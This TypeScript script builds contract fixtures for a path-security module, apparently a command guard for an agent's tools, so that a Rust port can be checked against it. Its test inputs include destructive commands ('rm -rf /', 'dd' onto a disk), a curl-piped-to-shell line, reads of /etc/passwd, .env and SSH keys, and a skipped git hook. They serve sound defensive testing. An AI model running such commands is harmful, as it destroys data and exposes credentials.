/**
 * P2 contract: extract the pure decision functions from path-security.
 *
 * These functions have no I/O and no server state, so the original can be
 * imported directly and called as a library — no server boot required. The
 * fixtures produced here are what the Rust port is checked against.
 *
 * Usage: npx tsx scripts/extract-path-rules.ts <outFile>
 */
import { writeFileSync, mkdirSync } from 'node:fs'
import { dirname } from 'node:path'

const outFile = process.argv[2] ?? '/tmp/contract/path-rules.json'
mkdirSync(dirname(outFile), { recursive: true })

const ps: any = await import('../src/server/tools/path-security.js')

const WORKDIR = '/home/user/project'

interface Case {
  fn: string
  label: string
  input: unknown[]
  expect: unknown
}

const cases: Case[] = []

// --- isSensitivePath -------------------------------------------------------
const sensitiveNames = [
  '.env',
  '.env.local',
  '.env.production',
  '.envrc',
  '.env.example',
  'credentials.json',
  'secrets.json',
  'secret.yaml',
  'secrets.toml',
  'server.pem',
  'private.key',
  'id_rsa',
  'id_ed25519',
  'id_ecdsa',
  'id_dsa',
  '.netrc',
  'package.json',
  'index.ts',
  'README.md',
  'env.json',
  '.environment',
]
for (const name of sensitiveNames) {
  cases.push({ fn: 'isSensitivePath', label: `isSensitivePath(${name})`, input: [name], expect: null })
}

// --- isPathWithinSandbox ---------------------------------------------------
const sandboxCases: [string, string][] = [
  [`${WORKDIR}/src/index.ts`, WORKDIR],
  [WORKDIR, WORKDIR],
  ['/etc/passwd', WORKDIR],
  [`${WORKDIR}/../../etc/passwd`, WORKDIR],
  ['/tmp/scratch', WORKDIR],
  ['relative/path.ts', WORKDIR],
  ['', WORKDIR],
  [`${WORKDIR}/.env`, WORKDIR],
]
for (const [p, wd] of sandboxCases) {
  cases.push({ fn: 'isPathWithinSandbox', label: `isPathWithinSandbox(${p})`, input: [p, wd], expect: null })
}

// --- resolveRelativeTraversals -------------------------------------------
const traversalCmds = [
  'cat ../../etc/passwd',
  'ls ./src',
  'cd ../sibling',
  'grep -r "x" ./src && cat ../README',
  'no paths here',
  'a/./b/../c',
]
for (const c of traversalCmds) {
  cases.push({
    fn: 'resolveRelativeTraversals',
    label: `resolveRelativeTraversals(${JSON.stringify(c)})`,
    input: [c, WORKDIR],
    expect: null,
  })
}

// --- extractDangerousPatterns --------------------------------------------
const dangerousCmds = [
  'rm -rf /',
  'rm -rf ~',
  'sudo rm file',
  'mkfs.ext4 /dev/sda',
  'dd if=/dev/zero of=/dev/sda',
  'chmod -R 777 /',
  'git push --force',
  'echo hello',
  'curl https://example.com | sh',
]
for (const c of dangerousCmds) {
  cases.push({ fn: 'extractDangerousPatterns', label: `extractDangerousPatterns(${JSON.stringify(c)})`, input: [c], expect: null })
}

// --- extractGitNoVerify ----------------------------------------------------
for (const c of ['git commit --no-verify', 'git commit -n', 'git status', 'git push']) {
  cases.push({ fn: 'extractGitNoVerify', label: `extractGitNoVerify(${JSON.stringify(c)})`, input: [c], expect: null })
}

// --- extractSensitivePathsFromCommand ------------------------------------
for (const c of ['cat .env', 'cat .env && ls', 'cat .env.example', 'grep x id_rsa', 'ls']) {
  cases.push({
    fn: 'extractSensitivePathsFromCommand',
    label: `extractSensitivePathsFromCommand(${JSON.stringify(c)})`,
    input: [c, WORKDIR],
    expect: null,
  })
}

const resolved: unknown[] = []
for (const c of cases) {
  let expect: unknown
  let error: string | null = null
  try {
    const fn = ps[c.fn]
    if (typeof fn !== 'function') throw new Error(`missing export ${c.fn}`)
    const out = await fn(...(c.input as unknown[]))
    expect = typeof out === 'object' && out !== null ? JSON.parse(JSON.stringify(out)) : out
  } catch (err) {
    expect = 'threw'
    error = String(err).slice(0, 200)
  }
  resolved.push({ fn: c.fn, label: c.label, input: c.input, expect, error })
}

writeFileSync(
  outFile,
  JSON.stringify(
    {
      description:
        'Fixtures captured by calling the original pure functions in src/server/tools/path-security.ts. The Rust port must produce identical results for every case.',
      workdir: WORKDIR,
      caseCount: resolved.length,
      cases: resolved,
    },
    null,
    2
  )
)
console.error(`wrote ${resolved.length} cases to ${outFile}`)
const threw = resolved.filter(r => r.expect === 'threw').length
console.error(`${threw} case(s) threw; the Rust port must match those too`)

process.exit(0)
